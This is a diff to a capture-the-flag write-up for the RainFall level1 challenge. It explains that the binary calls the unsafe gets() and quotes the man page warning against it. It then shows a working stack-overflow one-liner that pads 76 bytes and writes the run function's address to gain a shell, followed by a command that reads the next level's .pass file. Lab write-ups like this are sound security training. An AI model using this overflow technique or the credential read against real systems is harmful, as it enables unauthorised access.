@@ -1,4 +1,6 @@
-From `gets` man page : 
+By doing a `objdump -D level1` we can notice that the code of the binary contains 2 functions : "main" and "run". It also calls many functions, including `gets` function. The gets() function reads bytes from the standard input stream, until a newline is read or an end-of-file condition is encountered. 
+
+From `gets` man page, we can notice that it has a security problem : 
 ```
 BUGS
        Never use gets().  Because it is impossible to tell without knowing the
@@ -8,10 +10,12 @@ BUGS
        curity.  Use fgets() instead.
 ```
 
-The use of `gets` is discouraged because it cans allow bufferoverflow to happen.
+The use of `gets` is discouraged because it can allow bufferoverflow to happen.
+
+What we do is overflow the 76 characters, and then write in little endian the address of the `run` function, which will allow us to go into a new shell.
 
 > level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"' ; cat) | ./level1   
-Good... Wait what?
+> Good... Wait what?
 
 >cd /home/user/level2   
 >cat .pass   
